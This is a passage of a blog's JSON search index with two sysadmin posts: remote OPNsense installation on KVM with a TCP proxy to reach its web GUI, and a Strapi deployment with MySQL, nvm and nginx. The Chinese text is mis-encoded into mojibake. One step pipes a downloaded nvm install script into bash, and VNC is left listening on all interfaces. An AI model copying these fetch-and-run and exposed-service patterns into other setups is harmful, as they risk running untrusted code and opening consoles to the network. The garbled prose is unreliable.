çš„æœºå™¨å»è®¿é—®OPNsenseçš„ç®¡ç†ç•Œé¢äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20251023-opnsense_install/","summary":"\u003cp\u003eOPNsenseå®‰è£…å…¶å®å¾ˆå®¹æ˜“ï¼Œä½†æ˜¯è¿œç¨‹è£…å°±ä¸é‚£ä¹ˆå¥½ç©äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå°¤å…¶æ¶‰åŠåˆ°å†…ç½‘WEBGUIçš„è®¿é—®ï¼Œç¼ºçœå®‰è£…å®Œæˆä»¥åï¼Œåªèƒ½ä»å†…ç½‘å£è®¿é—®ç®¡ç†ç•Œé¢ï¼Œé—®é¢˜æ˜¯VPCé‡Œåªæœ‰ä¸€å°Linuxæœºå™¨ï¼Œè¿˜æ²¡æœ‰æµè§ˆå™¨ï¼Œæ€ä¹ˆåŠï¼Ÿ\u003c/p\u003e\n\u003cp\u003eè®°å½•ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ï¼Œå¤‡æŸ¥ï¼š\u003c/p\u003e\n\u003ch5 id=\"ä¸€ä¸‹è½½isoé•œåƒå¹¶è§£å‹\"\u003eä¸€ã€ä¸‹è½½isoé•œåƒå¹¶è§£å‹\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://pkg.opnsense.org/releases/25.7/OPNsense-25.7-dvd-amd64.iso.bz2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebzip2 -d OPNsense-25.7-dvd-amd64.iso.bz2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"äºŒkvmç”¨virt-installå®‰è£…isoæ³¨æ„æ¡¥æ¥äº†2ä¸ªç½‘å¡\"\u003eäºŒã€kvmç”¨virt-installå®‰è£…isoï¼Œæ³¨æ„æ¡¥æ¥äº†2ä¸ªç½‘å¡\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003emkdir -p /export/kvm/opn/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eqemu-img create -f qcow2 /export/kvm/opn/opn.qcow2 20G\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-install \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--name\u003cspan class=\"o\"\u003e=\u003c/span\u003eopn \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vcpu\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--ram\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2048\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--disk \u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/opn/opn.qcow2,format\u003cspan class=\"o\"\u003e=\u003c/span\u003eqcow2,size\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e20\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--cdrom\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/iso/OPNsense-25.7-dvd-amd64.iso \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0,model\u003cspan class=\"o\"\u003e=\u003c/span\u003evirtio \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr1,model\u003cspan class=\"o\"\u003e=\u003c/span\u003evirtio \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-type unix \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-variant freebsd13.1 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vnc --vnclisten\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0 --vncport\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5901\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"ä¸‰vncè¿åˆ°port-5901ä¸Šè¿›è¡Œå®‰è£…é…ç½®\"\u003eä¸‰ã€vncè¿åˆ°port 5901ä¸Šè¿›è¡Œå®‰è£…é…ç½®\u003c/h5\u003e\n\u003cp\u003eOPNsenseå…¬ç½‘çš„ç½‘å¡ã€ipã€maskã€gatewayé…ç½®\u003c/p\u003e\n\u003cp\u003eOPNsenseå†…ç½‘çš„ç½‘å¡ã€ipã€maské…ç½®\u003c/p\u003e\n\u003ch5 id=\"å››è®¾ç½®å†…ç½‘è®¿é—®\"\u003eå››ã€è®¾ç½®å†…ç½‘è®¿é—®\u003c/h5\u003e\n\u003cp\u003eè¿™é‡Œå°±éå¸¸é¬¼ç•œäº†ï¼Œé¦–å…ˆåœ¨å†…ç½‘çš„é‚£å°æœºå™¨ä¸Šåšportè½¬å‘ï¼Œè¿™å°æœºå™¨æ˜¯192.168.100.2ï¼Œåšä¸ªsystemdçš„service:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/systemd/system/opn-proxy.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eUnit\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAfter\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003enetwork.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eWants\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003enetwork.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eService\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eWorkingDirectory\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/bin/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eType\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esimple\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eExecStart\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/bin/go-tcp-proxy_1.0.2_linux_amd64 -l \u003cspan class=\"s2\"\u003e\u0026#34;:4430\u0026#34;\u003c/span\u003e -r \u003cspan class=\"s2\"\u003e\u0026#34;192.168.100.1:4430\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eRestart\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eon-failure\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eRestartSec\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eInstall\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eWantedBy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚ä¸Šçš„è¯ï¼Œå¦‚æœwebè®¿é—®http://192.168.100.2:4430ï¼Œé‚£Host: 192.168.100.1 ä¼šè¢«è½¬å‘ç»™ 192.168.100.1 çš„OPNsenseçš„4430ç«¯å£\u003c/p\u003e\n\u003cp\u003eé‚£OPNsenseçš„å†…ç½‘IPæ˜¯192.168.100.1ï¼Œç™»å½•ç”¨æˆ·æ˜¯rootï¼Œå¯†ç æ˜¯xxxxxxxx\u003c/p\u003e\n\u003cp\u003eä»vncä¸Šç™»å½•ï¼Œç„¶åè¿›å…¥shellï¼Œæ‰¾åˆ°webguiçš„éƒ¨åˆ†ï¼Œæ·»åŠ portå’Œalthostnamesçš„ä¸¤é¡¹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /conf/config.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;webgui\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;protocol\u0026gt;https\u0026lt;/protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;ssl-certref\u0026gt;68adc26101eeb\u0026lt;/ssl-certref\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;port\u0026gt;4430\u0026lt;/port\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;althostnames\u0026gt;192.168.100.2\u0026lt;/althostnames\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/webgui\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åé‡å¯webgui\u003c/p\u003e","title":"OPNsenseçš„è¿œç¨‹å®‰è£…å¹¶è®¿é—®WEBGUI"},{"content":"è€å®è¯´ï¼Œstrapiçš„å®‰è£…çœŸçš„ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹æƒ…ã€‚\nç¬¬ä¸€æ­¥æƒ³ç®€å•åŒ–ï¼Œäºæ˜¯å°±ç”¨Docker composeæ¥å®‰è£…ï¼Œç»“æœå¹¶ä¸å®¹æ˜“ï¼Œå®˜æ–¹æ–‡æ¡£ä¸å¯ç”¨ï¼Œæ”¹äº†åŠå¤©ç»ˆäºè·‘èµ·æ¥ï¼Œç„¶åï¼Œå˜¿å˜¿ï¼Œdockerhubä¸Šçš„strapi:latest æ—©å°±è¿‡æœŸå¾ˆä¹…äº†ã€‚\näºæ˜¯åˆç¢ç£¨å®ƒé‚£ä¸ªDocker buildç‰ˆæœ¬çš„ï¼Œé—®é¢˜æ˜¯ï¼Œéƒ½åœ¨å®¿ä¸»æœºç¯å¢ƒbuildå‡ºæ¥äº†ï¼Œç„¶åå†æ”¾åˆ°Dockeré•œåƒä¸­è·‘ï¼Œå²‚ä¸æ˜¯è„±è£¤å­æ”¾å±ï¼Œå¤šæ­¤ä¸€ä¸¾ä¹ˆã€‚\näºæ˜¯å›åˆ°åŸç‚¹ï¼Œéœ€è¦åœ¨CLIç¯å¢ƒä¸‹å®‰è£…ï¼Œç„¶åè¦éƒ¨ç½²åˆ°æ­£å¼ç”Ÿäº§ç¯å¢ƒã€‚\næ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€è£…mysql 8.0 apt install wget lsb-release gnupg -y wget https://dev.mysql.com/get/mysql-apt-config_0.8.29-1_all.deb dpkg -i mysql-apt-config_0.8.29-1_all.deb apt update apt install mysql-server äºŒã€è£…NVMï¼Œnodejså’Œyarn curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.4/install.sh | bash source ~/.nvm/nvm.sh nvm ls-remote nvm install v20.19.5 node -v npm install -g yarn npm list -g ä¸‰ã€åˆå§‹åŒ–strapi mkdir /data cd /data yarn create strapi # æˆ‘ä»¬è¦è·³è¿‡å®ƒé‚£ä¸ªå…è´¹30å¤©çš„growæ–¹æ¡ˆ # ç„¶åæ•°æ®åº“æ˜¯ mysql , å¡«å…¥mysqlçš„ä¸€ç³»åˆ—å‚æ•° # ä½¿ç”¨ts å››ã€é…ç½®strapi # åŠ å…¥è‡ªå·±çš„åŸŸå vi /data/strapi/config/server.ts export default ({ env }) =\u0026gt; ({ host: env(\u0026#39;HOST\u0026#39;, \u0026#39;0.0.0.0\u0026#39;), port: env.int(\u0026#39;PORT\u0026#39;, 1337), url: \u0026#39;https://blog.rendoumi.com\u0026#39;, app: { keys: env.array(\u0026#39;APP_KEYS\u0026#39;), }, }); # å»ºç«‹æ–°æ–‡ä»¶ vi /data/strapi/src/admin/vite.config.ts import { defineConfig, mergeConfig } from \u0026#39;vite\u0026#39;; export default (config) =\u0026gt; { return mergeConfig(config, defineConfig({ resolve: { alias: { \u0026#39;@\u0026#39;: \u0026#39;/src\u0026#39;, }, }, server: { allowedHosts: true } })); }; äº”ã€å®‰è£…nginxï¼Œè¿è¡Œç¨‹åº apt install nginx # æ³¨é‡Šæ‰æ— ç”¨é…ç½® vi /etc/nginx/nginx.conf # include /etc/nginx/sites-enabled/*; # æ–°å¢é…ç½® vi /etc/nginx/conf.d/strapi.conf upstream strapi { server 127.0.0.1:1337; } server { # Listen HTTP listen 80; server_name blog.rendoumi.com; # Redirect HTTP to HTTPS return 301 https://$host$request_uri; } server { # Listen HTTPS listen 443 ssl; server_name webcms.yoov.com; # SSL config ssl_certificate /usr/local/bin/certs/certificates/blog.rendoumi.com.crt; ssl_certificate_key /usr/local/bin/certs/certificates/blog.rendoumi.com.key; # Proxy Config location / { proxy_pass http://strapi; proxy_http_version 1.1; proxy_set_header X-Forwarded-Host $host; proxy_set_header X-Forwarded-Server $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Host $http_host; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;Upgrade\u0026#34;; proxy_pass_request_headers on; } } cd /data/strapi yarn develop ç„¶åç™»å½•å°±å¯ä»¥äº†ï¼Œè¯¡å¼‚çš„æ˜¯ç¬¬å››æ­¥ï¼Œå¦‚æœä¸gen vite.config.tsï¼Œé‚£nginxä»£ç†è®¿é—®local host:1337ä¸Šä¼šå‡ºé—®é¢˜ã€‚\nå…­ã€å‡çº§ yarn strapi version npx @strapi/upgrade latest ","permalink":"https://rendoumi.com/posts/20251016-strapi/","summary":"\u003cp\u003eè€å®è¯´ï¼Œstrapiçš„å®‰è£…çœŸçš„ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹æƒ…ã€‚\u003c/p\u003e\n\u003cp\u003eç¬¬ä¸€æ­¥æƒ³ç®€å•åŒ–ï¼Œäºæ˜¯å°±ç”¨Docker composeæ¥å®‰è£…ï¼Œç»“æœå¹¶ä¸å®¹æ˜“ï¼Œå®˜æ–¹æ–‡æ¡£ä¸å¯ç”¨ï¼Œæ”¹äº†åŠå¤©ç»ˆäºè·‘èµ·æ¥ï¼Œç„¶åï¼Œå˜¿å˜¿ï¼Œdockerhubä¸Šçš„strapi:latest æ—©å°±è¿‡æœŸå¾ˆä¹…äº†ã€‚\u003c/p\u003e\n\u003cp\u003eäºæ˜¯åˆç¢ç£¨å®ƒé‚£ä¸ªDocker buildç‰ˆæœ¬çš„ï¼Œé—®é¢˜æ˜¯ï¼Œéƒ½åœ¨å®¿ä¸»æœºç¯å¢ƒbuildå‡ºæ¥äº†ï¼Œç„¶åå†æ”¾åˆ°Dockeré•œåƒä¸­è·‘ï¼Œå²‚ä¸æ˜¯è„±è£¤å­æ”¾å±ï¼Œå¤šæ­¤ä¸€ä¸¾ä¹ˆã€‚\u003c/p\u003e\n\u003cp\u003eäºæ˜¯å›åˆ°åŸç‚¹ï¼Œéœ€è¦åœ¨CLIç¯å¢ƒä¸‹å®‰è£…ï¼Œç„¶åè¦éƒ¨ç½²åˆ°æ­£å¼ç”Ÿäº§ç¯å¢ƒã€‚\u003c/p\u003e\n\u003cp\u003eæ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch5 id=\"ä¸€è£…mysql-80\"\u003eä¸€ã€è£…mysql 8.0\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install wget lsb-release gnupg -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://dev.mysql.com/get/mysql-apt-config_0.8.29-1_all.deb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edpkg -i mysql-apt-config_0.8.29-1_all.deb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install mysql-server\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"äºŒè£…nvmnodejså’Œyarn\"\u003eäºŒã€è£…NVMï¼Œnodejså’Œyarn\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.4/install.sh \u003cspan class=\"p\"\u003e|\u003c/span\u003e bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003esource\u003c/span\u003e ~/.nvm/nvm.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm ls-remote\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm install v20.19.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enode -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm install -g yarn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm list -g\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"ä¸‰åˆå§‹åŒ–strapi\"\u003eä¸‰ã€åˆå§‹åŒ–strapi\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyarn create strapi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æˆ‘ä»¬è¦è·³è¿‡å®ƒé‚£ä¸ªå…è´¹30å¤©çš„growæ–¹æ¡ˆ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç„¶åæ•°æ®åº“æ˜¯ mysql , å¡«å…¥mysqlçš„ä¸€ç³»åˆ—å‚æ•°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ä½¿ç”¨ts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"å››é…ç½®strapi\"\u003eå››ã€é…ç½®strapi\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# åŠ å…¥è‡ªå·±çš„åŸŸå\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /data/strapi/config/server.ts\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e default \u003cspan class=\"o\"\u003e({\u003c/span\u003e env \u003cspan class=\"o\"\u003e})\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e({\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  host: env\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;HOST\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;0.0.0.0\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  port: env.int\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;PORT\u0026#39;\u003c/span\u003e, 1337\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  url: \u003cspan class=\"s1\"\u003e\u0026#39;https://blog.rendoumi.com\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  app: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    keys: env.array\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;APP_KEYS\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å»ºç«‹æ–°æ–‡ä»¶\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /data/strapi/src/admin/vite.config.ts\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 